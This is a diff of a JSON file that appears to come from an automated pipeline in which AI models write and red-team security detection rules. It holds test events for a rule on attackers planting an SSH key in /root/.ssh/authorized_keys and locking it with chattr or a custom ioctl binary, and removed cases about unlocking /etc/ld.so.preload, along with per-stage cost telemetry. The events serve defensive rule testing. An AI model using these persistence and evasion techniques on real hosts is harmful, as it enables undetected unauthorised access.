-            "Image": "/opt/evil/bin/selo",
-            "CommandLine": "/opt/evil/bin/selo 0",
-            "ParentImage": "/bin/bash",
+            "TargetFilename": "/root/.ssh/authorized_keys",
+            "Image": "/tmp/evilchattr",
             "User": "root"
           }
         },
         {
           "id": "X2",
           "label": "positive",
-          "description": "Renamed chattr binary with altered name; Image does not end with /chattr",
+          "description": "Attacker uses a custom static binary that calls ioctl(FS_IOC_SETFLAGS) directly, never invoking chattr",
           "event": {
-            "Image": "/opt/evil/bin/cha",
-            "CommandLine": "/opt/evil/bin/cha -i /etc/ld.so.preload",
-            "ParentImage": "/bin/bash",
+            "TargetFilename": "/root/.ssh/authorized_keys",
+            "Image": "/tmp/setimmutable",
             "User": "root"
           }
         },
         {
           "id": "X3",
           "label": "positive",
-          "description": "ChatTR with path containing extra dot segment; literal substring '-i /etc/ld.so.preload' not present",
+          "description": "Attacker writes the key via sshd (one event) and runs chattr minutes later (separate event); rule expects single combined event",
           "event": {
+            "TargetFilename": "/root/.ssh/authorized_keys",
             "Image": "/usr/bin/chattr",
-            "CommandLine": "/usr/bin/chattr -i /etc/./ld.so.preload",
-            "ParentImage": "/bin/bash",
             "User": "root"
           }
         }
@@ -2497,128 +2513,198 @@
         "tier": "fast",
         "model": "nvidia/Nemotron-3_5-Lightning",
         "prompt_tokens": 4169,
-        "completion_tokens": 2815,
-        "latency_s": 9.615,
-        "cost_usd": 0.000926,
+        "completion_tokens": 3407,
+        "latency_s": 11.436,
+        "cost_usd": 0.001068,
         "thinking": false
       },
       {
         "stage": "plan",
         "tier": "reasoning",
         "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
-        "prompt_tokens": 5452,
-        "completion_tokens": 5042,
-        "latency_s": 14.857,
-        "cost_usd": 0.020578,
+        "prompt_tokens": 6099,
+        "completion_tokens": 4369,
+        "latency_s": 13.139,
+        "cost_usd": 0.019206,
         "thinking": true
       },
       {
         "stage": "author",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 4415,
-        "completion_tokens": 514,
-        "latency_s": 3.43,
-        "cost_usd": 0.001787,
+        "prompt_tokens": 4438,
+        "completion_tokens": 545,
+        "latency_s": 4.336,
+        "cost_usd": 0.001822,
         "thinking": false
       },
       {
         "stage": "author",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3861,
-        "completion_tokens": 825,
-        "latency_s": 5.321,
-        "cost_usd": 0.001901,
-        "thinking": false
-      },
-      {
-        "stage": "author",
-        "tier": "main",
-        "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 4279,
-        "completion_tokens": 2434,
-        "latency_s": 10.486,
-        "cost_usd": 0.003474,
-        "thinking": false
-      },
-      {
-        "stage": "redteam",
-        "tier": "reasoning",
-        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
-        "prompt_tokens": 2403,
-        "completion_tokens": 2915,
-        "latency_s": 9.8,
-        "cost_usd": 0.011148,
-        "thinking": true
-      },
-      {
-        "stage": "redteam",
-        "tier": "reasoning",
-        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
-        "prompt_tokens": 2123,
-        "completion_tokens": 3835,
-        "latency_s": 12.915,
-        "cost_usd": 0.013628,
-        "thinking": true
-      },
-      {
-        "stage": "author",
-        "tier": "main",
-        "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3998,
-        "completion_tokens": 726,
-        "latency_s": 3.844,
-        "cost_usd": 0.001853,
-        "thinking": false
-      },
-      {
-        "stage": "author",
-        "tier": "main",
-        "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 3936,
-        "completion_tokens": 932,
-        "latency_s": 5.055,
-        "cost_usd": 0.00202,
+        "prompt_tokens": 4332,
+        "completion_tokens": 781,
+        "latency_s": 5.622,
+        "cost_usd": 0.002002,
         "thinking": false
       },
       {
         "stage": "refine",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 4898,
-        "completion_tokens": 386,
-        "latency_s": 2.445,
-        "cost_usd": 0.001817,
+        "prompt_tokens": 5085,
+        "completion_tokens": 268,
+        "latency_s": 2.137,
+        "cost_usd": 0.001767,
         "thinking": false
       },
       {
-        "stage": "refine",
+        "stage": "author",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 5106,
-        "completion_tokens": 319,
-        "latency_s": 2.308,
-        "cost_usd": 0.001819,
+        "prompt_tokens": 4195,
+        "completion_tokens": 2630,
+        "latency_s": 12.432,
+        "cost_usd": 0.003625,
         "thinking": false
       },
       {
         "stage": "redteam",
         "tier": "reasoning",
         "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
-        "prompt_tokens": 3152,
-        "completion_tokens": 5882,
-        "latency_s": 15.11,
-        "cost_usd": 0.020798,
+        "prompt_tokens": 2115,
+        "completion_tokens": 2728,
+        "latency_s": 8.646,
+        "cost_usd": 0.010299,
         "thinking": true
       },
       {
         "stage": "refine",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 4876,
-        "completion_tokens": 320,
-        "latency_s": 2.075,
+        "prompt_tokens": 5465,
+        "completion_tokens": 408,
+        "latency_s": 2.882,
+        "cost_usd": 0.002007,
+        "thinking": false
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3706,
+        "completion_tokens": 597,
+        "latency_s": 3.585,
+        "cost_usd": 0.001649,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4878,
+        "completion_tokens": 236,
+        "latency_s": 1.957,
+        "cost_usd": 0.001676,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4993,
+        "completion_tokens": 236,
+        "latency_s": 1.717,
+        "cost_usd": 0.00171,
+        "thinking": false
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2328,
+        "completion_tokens": 3907,
+        "latency_s": 13.169,
+        "cost_usd": 0.014049,
+        "thinking": true
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4874,
+        "completion_tokens": 224,
+        "latency_s": 1.884,
+        "cost_usd": 0.001664,
+        "thinking": false
+      },
+      {
+        "stage": "author",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 3837,
+        "completion_tokens": 1122,
+        "latency_s": 5.843,
+        "cost_usd": 0.002161,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4897,
+        "completion_tokens": 324,
+        "latency_s": 2.321,
+        "cost_usd": 0.001761,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 5152,
+        "completion_tokens": 331,
+        "latency_s": 2.259,
+        "cost_usd": 0.001844,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4885,
+        "completion_tokens": 333,
+        "latency_s": 2.403,
+        "cost_usd": 0.001765,
+        "thinking": false
+      },
+      {
+        "stage": "redteam",
+        "tier": "reasoning",
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "prompt_tokens": 2121,
+        "completion_tokens": 3914,
+        "latency_s": 12.978,
+        "cost_usd": 0.013863,
+        "thinking": true
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 4989,
+        "completion_tokens": 245,
+        "latency_s": 1.975,
+        "cost_usd": 0.001717,
+        "thinking": false
+      },
+      {
+        "stage": "refine",
+        "tier": "main",
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "prompt_tokens": 5134,
+        "completion_tokens": 234,
+        "latency_s": 2.345,
         "cost_usd": 0.001751,
         "thinking": false
       },
@@ -2626,40 +2712,40 @@
         "stage": "redteam",
         "tier": "reasoning",
         "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
-        "prompt_tokens": 2398,
-        "completion_tokens": 3362,
-        "latency_s": 11.191,
-        "cost_usd": 0.012484,
+        "prompt_tokens": 2460,
+        "completion_tokens": 2658,
+        "latency_s": 8.378,
+        "cost_usd": 0.010434,
         "thinking": true
       },
       {
         "stage": "redteam",
         "tier": "reasoning",
         "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
-        "prompt_tokens": 2284,
-        "completion_tokens": 5339,
-        "latency_s": 17.433,
-        "cost_usd": 0.018301,
+        "prompt_tokens": 3145,
+        "completion_tokens": 9153,
+        "latency_s": 27.049,
+        "cost_usd": 0.030604,
         "thinking": true
       },
       {
         "stage": "refine",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 5172,
-        "completion_tokens": 533,
-        "latency_s": 3.324,
-        "cost_usd": 0.002031,
+        "prompt_tokens": 4887,
+        "completion_tokens": 334,
+        "latency_s": 2.22,
+        "cost_usd": 0.001767,
         "thinking": false
       },
       {
         "stage": "refine",
         "tier": "main",
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "prompt_tokens": 5171,
-        "completion_tokens": 494,
-        "latency_s": 2.518,
-        "cost_usd": 0.001996,
+        "prompt_tokens": 5525,
+        "completion_tokens": 436,
+        "latency_s": 3.055,
+        "cost_usd": 0.00205,
         "thinking": false
       }
     ]
